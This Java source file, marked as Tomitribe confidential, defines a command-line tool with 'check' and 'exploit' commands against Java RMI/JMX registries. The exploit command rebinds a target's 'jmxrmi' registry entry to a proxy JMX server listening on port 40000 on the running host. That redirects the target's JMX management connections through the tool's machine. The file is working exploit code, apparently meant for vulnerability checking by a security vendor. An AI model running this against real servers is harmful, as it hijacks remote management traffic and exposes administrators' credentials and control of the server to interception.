/*
 * Tomitribe Confidential
 *
 * Copyright Tomitribe Corporation. 2019
 *
 * The source code for this program is not published or otherwise divested
 * of its trade secrets, irrespective of what has been deposited with the
 * U.S. Copyright Office.
 */
package org.tomitribe.rmi;

import org.tomitribe.crest.api.Command;
import org.tomitribe.crest.api.Option;
import org.tomitribe.crest.api.Required;
import org.tomitribe.crest.api.StreamingOutput;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnectorServer;
import javax.management.remote.rmi.RMIServer;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.UnknownHostException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIServerSocketFactory;
import java.util.HashMap;
import java.util.Map;

public class ExploitCommands {

    @Command("check")
    public StreamingOutput check(final @Required @Option({"host"}) String host, final @Required @Option({"port"}) Integer port) {
        return new StreamingOutput() {
            @Override
            public void write(final OutputStream outputStream) throws IOException {
                final PrintWriter pw = new PrintWriter(outputStream);

                final Registry registry = LocateRegistry.getRegistry(host, port);
                try {
                    final Remote server = registry.lookup("jmxrmi");
                    if (! RMIServer.class.isInstance(server)) {
                        pw.println("jmxrmi is not bound to an RMI Server");
                        pw.flush();
                        return;
                    }

                    try {
                        registry.rebind("jmxrmi", server);
                        pw.println("It appears to be possible to rebind the RMI server in the registry, this server is potentially vulnerable to CVE");
                        pw.flush();
                    } catch (Throwable t) {
                        pw.println("Unable to rebind, server appears to be patched.");
                        pw.flush();
                        return;
                    }
                } catch (Throwable t) {
                    pw.println("Unable to check: " + t.getMessage());
                    t.printStackTrace(pw);
                    pw.flush();
                    return;
                }
            }
        };
    }

    @Command
    public StreamingOutput exploit(final @Required @Option({"host"}) String host, final @Required @Option({"port"}) Integer port) {
        return new StreamingOutput() {
            @Override
            public void write(final OutputStream outputStream) throws IOException {
                final PrintWriter pw = new PrintWriter(outputStream);

                final Registry registry = LocateRegistry.getRegistry(host, port);
                try {
                    final Remote server = registry.lookup("jmxrmi");
                    if (! RMIServer.class.isInstance(server)) {
                        pw.println("jmxrmi is not bound to an RMI Server");
                        pw.flush();
                        return;
                    }

                    final RMIServer stub = RMIServer.class.cast(server);

                    final Map<String,Object> env = new HashMap<>();
                    final ProxyRMIJRMPServerImpl proxyServer = new ProxyRMIJRMPServerImpl(
                            40000, null, new RmiServerBindSocketFactory("0.0.0.0"), env, stub);

                    final RMIConnectorServer cs = new RMIConnectorServer(
                            new JMXServiceURL("service:jmx:rmi://localhost"),
                            env,
                            proxyServer,
                            ManagementFactory.getPlatformMBeanServer());

                    cs.start();

                    final Remote jmxServer = proxyServer.toStub();
                    registry.rebind("jmxrmi", jmxServer);


                    pw.println("Redirected JMX on target to 40000 on this host. Listening for connections to proxy...");
                    pw.flush();


                } catch (NotBoundException e) {
                    e.printStackTrace();
                }
            }
        };
    }

    public static class RmiServerBindSocketFactory implements RMIServerSocketFactory {

        private final InetAddress bindAddress;

        public RmiServerBindSocketFactory(String address) {
            InetAddress bindAddress = null;
            try {
                bindAddress = InetAddress.getByName(address);
            } catch (UnknownHostException e) {

            }
            this.bindAddress = bindAddress;
        }

        @Override
        public ServerSocket createServerSocket(int port) throws IOException  {
            return new ServerSocket(port, 0, bindAddress);
        }
    }



}
